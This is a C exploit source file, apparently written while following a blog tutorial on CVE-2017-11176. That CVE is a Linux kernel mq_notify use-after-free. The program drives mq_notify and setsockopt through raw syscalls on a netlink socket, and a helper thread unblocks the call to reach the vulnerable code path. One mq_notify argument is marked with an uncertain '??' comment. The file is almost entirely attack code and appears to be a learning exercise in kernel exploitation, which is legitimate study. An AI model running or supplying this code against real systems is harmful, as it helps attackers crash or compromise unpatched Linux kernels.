
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.htm

/* Aim
1.  0 < optlen  <  sizeOf(int)
2. the fd should be a valid socket
3. level must be SOL_NETLINK
4. optname must be NETLINK_NO_ENOBUFS
5. optval should be a readable memory location with non zero value
*/
//gcc -lrt -pthread exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_setsockopt, socket, level, option_name, option_value, option_len)

void* unblock(void *threadVar)
{
    sleep(5);
    int sockFD = (int) threadVar;
    int val = 55;
    if(_setsockopt(sockFD, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
}

int main()
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));
    int sockFD = _socket(AF_NETLINK, SOCK_RAW ,NETLINK_GENERIC);
    if(sockFD < 0)
    {
        perror("socket");
        return -1;
    }

    pthread_t thread;
    if(pthread_create(&thread, NULL, &unblock, (void *)sockFD))
    {
        perror("pthread_create");
        return -1;
    }

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = sockFD;

    mqd_t mqdes = (mqd_t) -1; // ??
    
    printf("%p\n", &sevp);    
    if(_mq_notify(mqdes, &sevp)==0)
    {
        printf("call succeeded\n");
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
        return -1;
    }

    pthread_join(thread, NULL);
    return 0;
}
